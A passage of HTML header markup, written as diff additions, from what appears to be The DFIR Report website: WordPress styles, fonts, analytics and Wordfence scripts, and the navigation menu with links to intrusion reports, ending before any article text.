+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(body) { margin: 0; }:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}body{padding-top: 0px;padding-right: 0px;padding-bottom: 0px;padding-left: 0px;}:root :where(.wp-element-button, .wp-block-button__link){background-color: #32373c;border-width: 0;color: #fff;font-family: inherit;font-size: inherit;font-style: inherit;font-weight: inherit;letter-spacing: inherit;line-height: inherit;padding-top: calc(0.667em + 2px);padding-right: calc(1.333em + 2px);padding-bottom: calc(0.667em + 2px);padding-left: calc(1.333em + 2px);text-decoration: none;text-transform: inherit;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+<style type="text/css">@font-face {font-family:'DM Sans';font-style:normal;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin/opsz/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'DM Sans';font-style:normal;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin-ext/opsz/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'DM Sans';font-style:italic;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin-ext/opsz/italic.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}@font-face {font-family:'DM Sans';font-style:italic;font-weight:100 1000;src:url(/cf-fonts/v/dm-sans/5.2.8/latin/opsz/italic.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/cyrillic/wght/normal.woff2);unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/latin/wght/normal.woff2);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;font-display:swap;}@font-face {font-family:'Geist';font-style:normal;font-weight:100 900;src:url(/cf-fonts/v/geist/5.2.8/latin-ext/wght/normal.woff2);unicode-range:U+0100-02BA,U+02BD-02C5,U+02C7-02CC,U+02CE-02D7,U+02DD-02FF,U+0304,U+0308,U+0329,U+1D00-1DBF,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20C0,U+2113,U+2C60-2C7F,U+A720-A7FF;font-display:swap;}</style>
+<link rel='stylesheet' id='avia-module-main-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/main.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='theme-single-common-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/single-common.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='theme-gutenberg-css' href='https://thedfirreport.com/wp-content/themes/dfir/assets/css/gutenberg.css?ver=1.1.81' media='all' />
+<link rel='stylesheet' id='avia-module-offsets-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/offsets.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='punch-core-gutenberg-css' href='https://thedfirreport.com/wp-content/themes/punch/assets/css/gutenberg.css?ver=1.0.94' media='all' />
+<link rel='stylesheet' id='wp-block-heading-css' href='https://thedfirreport.com/wp-includes/blocks/heading/style.min.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='wp-block-paragraph-css' href='https://thedfirreport.com/wp-includes/blocks/paragraph/style.min.css?ver=7.0.2' media='all' />
+<link rel='stylesheet' id='wp-block-preformatted-css' href='https://thedfirreport.com/wp-includes/blocks/preformatted/style.min.css?ver=7.0.2' media='all' />
+<script id="avia-compat-js" src="https://thedfirreport.com/wp-content/themes/punch/assets/js/dist/avia/avia-compat.js?ver=1.0.96"></script>
+<link rel="https://api.w.org/" href="https://thedfirreport.com/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://thedfirreport.com/wp-json/wp/v2/posts/37127" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://thedfirreport.com/xmlrpc.php?rsd" />
+<link rel='shortlink' href='https://thedfirreport.com/?p=37127' />
+
+		<!-- GA Google Analytics @ https://m0n.co/ga -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6F85L400D"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+			gtag('config', 'G-N6F85L400D');
+		</script>
+
+	<script type="text/javascript">
+(function(url){
+	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
+	var addEvent = function(evt, handler) {
+		if (window.addEventListener) {
+			document.addEventListener(evt, handler, false);
+		} else if (window.attachEvent) {
+			document.attachEvent('on' + evt, handler);
+		}
+	};
+	var removeEvent = function(evt, handler) {
+		if (window.removeEventListener) {
+			document.removeEventListener(evt, handler, false);
+		} else if (window.detachEvent) {
+			document.detachEvent('on' + evt, handler);
+		}
+	};
+	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
+	var logHuman = function() {
+		if (window.wfLogHumanRan) { return; }
+		window.wfLogHumanRan = true;
+		var wfscr = document.createElement('script');
+		wfscr.type = 'text/javascript';
+		wfscr.async = true;
+		wfscr.src = url + '&r=' + Math.random();
+		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
+		for (var i = 0; i < evts.length; i++) {
+			removeEvent(evts[i], logHuman);
+		}
+	};
+	for (var i = 0; i < evts.length; i++) {
+		addEvent(evts[i], logHuman);
+	}
+})('//thedfirreport.com/?wordfence_lh=1&hid=84388925AC7706D11878E8FE4339E281');
+</script>	<style>img#wpstats{display:none}</style>
+		<!-- Head & Footer Code: Site-wide HEAD section start (post) -->
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-N6F85L400D"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){ dataLayer.push(arguments); }
+  gtag('js', new Date());
+
+  gtag('config', 'G-N6F85L400D', {
+    send_page_view: true
+  });
+
+  gtag('config', 'UA-162747485-1', {
+    anonymize_ip: true
+  });
+</script>
+<!-- Head & Footer Code: Site-wide HEAD section end (post) -->
+<link rel="profile" href="https://gmpg.org/xfn/11" />
+<link rel="alternate" type="application/rss+xml" title="The DFIR Report RSS2 Feed" href="https://thedfirreport.com/feed/" />
+<link rel="pingback" href="https://thedfirreport.com/xmlrpc.php" />
+	<script>document.addEventListener("DOMContentLoaded",function(){document.documentElement.style.setProperty("--scrollBarWidth",window.innerWidth-document.body.clientWidth+"px")});</script>
+	<style>.ep-lottie-loaded{opacity:1!important}</style>	<noscript>
+		<link rel="stylesheet" href="https://thedfirreport.com/wp-content/themes/punch/assets/css/dist/no-js.css?v=1.0.94">
+	</noscript>
+    
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/DFIR-Favicon-Image@2x.png" type="image/png">
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-32x32.png" sizes="32x32" />
+<link rel="icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-192x192.png" sizes="192x192" />
+<link rel="apple-touch-icon" href="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-180x180.png" />
+<meta name="msapplication-TileImage" content="https://thedfirreport.com/wp-content/uploads/cropped-DFIR-Favicon-Image@2x-270x270.png" />
+
+<!-- custom styles set at your backend-->
+<style type='text/css' id='dynamic-styles'>
+</style>
+
+<!-- end custom styles-->
+
+<style type='text/css'>
+@font-face {font-family: 'fa-fontello'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff2?ver=1.1.81') format('woff2'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.woff?ver=1.1.81') format('woff'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.ttf?ver=1.1.81') format('truetype'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.svg?ver=1.1.81#fa-fontello') format('svg'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=1.1.81'),
+url('https://thedfirreport.com/wp-content/themes/punch/assets/fonts/fa-fontello.eot?ver=1.1.81#iefix') format('embedded-opentype');
+} #top .avia-font-fa-fontello, body .avia-font-fa-fontello, html body [data-av_iconfont='fa-fontello']:before{ font-family: 'fa-fontello'; }
+
+@font-face {font-family: 'dfir-icons'; font-weight: normal; font-style: normal; font-display: auto;
+src: url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.woff2?ver=1.1.81') format('woff2'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.woff?ver=1.1.81') format('woff'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.ttf?ver=1.1.81') format('truetype'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.svg?ver=1.1.81#dfir-icons') format('svg'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.eot?ver=1.1.81'),
+url('https://thedfirreport.com/wp-content/uploads/avia_fonts/dfir-icons/dfir-icons.eot?ver=1.1.81#iefix') format('embedded-opentype');
+} #top .avia-font-dfir-icons, body .avia-font-dfir-icons, html body [data-av_iconfont='dfir-icons']:before{ font-family: 'dfir-icons'; }
+</style>
+</head>
+
+<body id="top" class="wp-singular post-template-default single single-post postid-37127 single-format-standard wp-theme-punch wp-child-theme-dfir rtl_columns av-curtain-numeric avia-responsive-images-support">
+
+	
+	<div id='wrap_all'>
+
+	
+<div id="header" class="header    has-bar ">
+    		<div class="announcement-banner">
+			<div class="announcement-banner-inner">
+					<div class="banner-text"> View the latest</div>
+											<a href="https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira" class="banner-link">DFIR Report</a>
+									<button class="close-bar" onClick="(function(){ const header = document.getElementById('header'); const banner = document.querySelector('.announcement-banner'); if(header){ header.classList.remove('has-bar'); } if(document.documentElement){ document.documentElement.classList.remove('has-banner'); } if(banner){ banner.style.display = 'none'; } })()">X</button>
+			</div>
+		</div>
+		<div class="header-inner">
+		<div class="header-logo">
+				<a href="https://thedfirreport.com" class="logo aria-label="Dfir Logo">
+		<div class='logo-main'><img width="292" height="110" src="https://thedfirreport.com/wp-content/uploads/DFIR-REPORT-Logo@2x.png" class="attachment-full size-full" alt="" decoding="async" /></div><div class='logo-alternate'><img width="292" height="108" src="https://thedfirreport.com/wp-content/uploads/DFIR-White-Logo.png" class="attachment-full size-full" alt="" decoding="async" /></div>    </a>
+			</div>
+		<div class="header-menu">
+			<div class="menu-main-menu-container"><ul id="menu-main-menu" class="main-menu" role="menu"><li role="menuitem" id="menu-item-937" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-top-level menu-item-top-level-1"><a class="menu-item-inner" href="https://thedfirreport.com/reports/" tabindex="0"><span class="avia-menu-text">Public Reports</span></a></li>
+<li role="menuitem" id="menu-item-962" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-2"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Products</span></span>
+<div class='avia_mega_div avia_mega3 nine units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49071" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-938" class="menu-overview menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/" tabindex="0"><span class="avia-menu-text">Products Overview</span></a></li>
+		<li role="menuitem" id="menu-item-946" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/" tabindex="0"><span class="avia-menu-text">Threat Intel</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-49370" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-feed/" tabindex="0"><span class="avia-menu-text">Threat Feed</span></a></li>
+			<li role="menuitem" id="menu-item-948" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/private-dfir-reports/" tabindex="0"><span class="avia-menu-text">Private DFIR Reports</span></a></li>
+			<li role="menuitem" id="menu-item-947" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/threat-intel/all-intel/" tabindex="0"><span class="avia-menu-text">All Intel</span></a></li>
+			<li role="menuitem" id="menu-item-941" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/active-defense/" tabindex="0"><span class="avia-menu-text">Active Defense</span></a></li>
+		</ul>
+</li>
+		<li role="menuitem" id="menu-item-944" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/dfir-labs/" tabindex="0"><span class="avia-menu-text">DFIR Labs</span></a></li>
+		<li role="menuitem" id="menu-item-942" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/case-artifacts/" tabindex="0"><span class="avia-menu-text">Case Artifacts</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49069" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units ">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49074" class="menu-spacer menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span></li>
+		<li role="menuitem" id="menu-item-943" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/detection-pack/" tabindex="0"><span class="avia-menu-text">Detection Pack</span></a></li>
+		<li role="menuitem" id="menu-item-954" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/products/ai-training-ground/" tabindex="0"><span class="avia-menu-text">AI Training Ground</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49070" class="featured-column menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_3 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49072" class="menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span>    <div class="mega-menu-featured-post">
+                    <div class="mega-menu-featured-post-category">
+                <span class='ep-item-term ep-item-term-bruteratel'  >bruteratel</span>            </div>
+                <div class="mega-menu-featured-post-title">
+            <a href="https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/" >
+                From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion            </a>
+        </div>
+        <div class="mega-menu-featured-post-button">
+            <a href="https://thedfirreport.com/2025/09/29/from-a-single-click-how-lunar-spider-enabled-a-near-two-month-intrusion/"  class="avia-button avia-color-light-gray">Read More</a>
+        </div>
+    </div>
+    </li>
+		<li role="menuitem" id="menu-item-49073" class="menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span>    <div class="mega-menu-featured-post">
+                    <div class="mega-menu-featured-post-category">
+                <span class='ep-item-term ep-item-term-dragonforce'  >dragonforce</span>            </div>
+                <div class="mega-menu-featured-post-title">
+            <a href="https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/" >
+                Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs            </a>
+        </div>
+        <div class="mega-menu-featured-post-button">
+            <a href="https://thedfirreport.com/2025/09/08/blurring-the-lines-intrusion-shows-connection-with-three-major-ransomware-gangs/"  class="avia-button avia-color-light-gray">Read More</a>
+        </div>
+    </div>
+    </li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-963" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-3"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Services</span></span>
+<div class='avia_mega_div avia_mega2 six units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49133" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-940" class="menu-overview menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/" tabindex="0"><span class="avia-menu-text">Services Overview</span></a></li>
+		<li role="menuitem" id="menu-item-953" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/" tabindex="0"><span class="avia-menu-text">Training</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-956" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/training/threat-hunting/" tabindex="0"><span class="avia-menu-text">Threat Hunting</span></a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49135" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-49134" class="menu-spacer menu-item menu-item-type-custom menu-item-object-custom"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">-</span></span></li>
+		<li role="menuitem" id="menu-item-949" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/" tabindex="0"><span class="avia-menu-text">Professional Services</span></a>
+		<ul role="menu" class="sub-menu">
+			<li role="menuitem" id="menu-item-952" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/integration/" tabindex="0"><span class="avia-menu-text">Integration</span></a></li>
+			<li role="menuitem" id="menu-item-950" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/cti-program-advisory/" tabindex="0"><span class="avia-menu-text">CTI Program Advisory</span></a></li>
+			<li role="menuitem" id="menu-item-951" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/services/professional-services/incident-response-playbook/" tabindex="0"><span class="avia-menu-text">Incident Response Playbook</span></a></li>
+		</ul>
+</li>
+	</ul>
+</li>
+</ul>
+
+</div>
+</li>
+<li role="menuitem" id="menu-item-984" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-mega-parent  menu-item-top-level menu-item-top-level-4"><span class="menu-item-inner no-link"  tabindex="0"><span class="avia-menu-text">Company</span></span>
+<div class='avia_mega_div avia_mega2 six units'>
+
+<ul role="menu" class="sub-menu">
+	<li role="menuitem" id="menu-item-49131" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units  avia_mega_menu_columns_first">
+	<ul role="menu" class="sub-menu">
+		<li role="menuitem" id="menu-item-957" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/about-us/" tabindex="0"><span class="avia-menu-text">About us</span></a></li>
+		<li role="menuitem" id="menu-item-960" class="menu-item menu-item-type-post_type menu-item-object-page"><a class="menu-item-inner" href="https://thedfirreport.com/company/contact-us/" tabindex="0"><span class="avia-menu-text">Contact Us</span></a></li>
+	</ul>
+</li>
+	<li role="menuitem" id="menu-item-49130" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children avia_mega_menu_columns_2 three units avia_mega_menu_columns_last">
+	<ul role="menu" class="sub-menu">
